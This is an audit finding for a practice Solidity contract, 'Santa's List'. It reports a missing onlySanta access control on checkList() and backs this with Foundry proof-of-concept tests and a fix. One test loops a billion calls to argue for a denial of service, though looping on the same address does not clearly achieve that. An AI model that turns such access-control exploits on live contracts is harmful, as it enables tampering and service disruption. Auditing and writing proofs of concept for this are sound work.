## [H1] Anyone can call checkList() function

### Severity

High Risk

### Date Modified

Nov 30th, 2023

### Summary

The elves forgot to add the onlySanta modifier to the checkList() function, so anyone can call it and add users to the list. This situation presents several problems:

1. The code should work as expected and this is an onlySanta function and should work as such.
2. The grinch could add enough users to make checkListTwice() unusable via a DoS attack.

### Vulnerability Details (PoC)

Let's start by calling the function with an anonymous user:

```
function test_UserCallCheckList() public {
        vm.prank(user);
        santasList.checkList(user, SantasList.Status.NICE);
        assertEq(uint256(santasList.getNaughtyOrNiceOnce(user)), uint256(SantasList.Status.NICE));
    }
```

```
➜  2023-11-Santas-List git:(main) ✗ forge test --mt test_UserCallCheckList
[⠢] Compiling...
No files changed, compilation skipped

Running 1 test for test/unit/SantasListTest.t.sol:SantasListTest
[PASS] test_UserCallCheckList() (gas: 16036)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.36ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
➜  2023-11-Santas-List git:(main) ✗
```

This is enough for a High Risk vulnerability but let´s create infinite loops to destroy the function and contract:

```
function test_CheckListInfiniteLoop() public {
        vm.startPrank(user);
        for (uint256 i = 1; i < 1_000_000_000; ++i) {
            santasList.checkList(user, SantasList.Status.NICE);
        }
        vm.stopPrank();
    }
```

The contract could be inaccessible (DoS attack) and a malicious actor could add multiple users to the mapping.

### Impact

The contract could be inaccessible (DoS attack) and a malicious actor could add multiple users to the mapping.

### Tools Used

Manual, foundry

### Recommendations

Add the onlySanta protection as expected

```
function checkList(address person, Status status) external onlySanta {
        s_theListCheckedOnce[person] = status;
        emit CheckedOnce(person, status);
    }

```

```
➜  2023-11-Santas-List git:(main) ✗ forge test --mt test_UserCallCheckList


[⠢] Compiling...
[⠔] Compiling 2 files with 0.8.22
[⠒] Solc 0.8.22 finished in 1.27s
Compiler run successful!

Running 1 test for test/unit/SantasListTest.t.sol:SantasListTest
[FAIL. Reason: SantasList__NotSanta()] test_UserCallCheckList() (gas: 10924)
Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 5.76ms

Ran 1 test suites: 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/unit/SantasListTest.t.sol:SantasListTest
[FAIL. Reason: SantasList__NotSanta()] test_UserCallCheckList() (gas: 10924)

Encountered a total of 1 failing tests, 0 tests succeeded
➜  2023-11-Santas-List git:(main) ✗

```
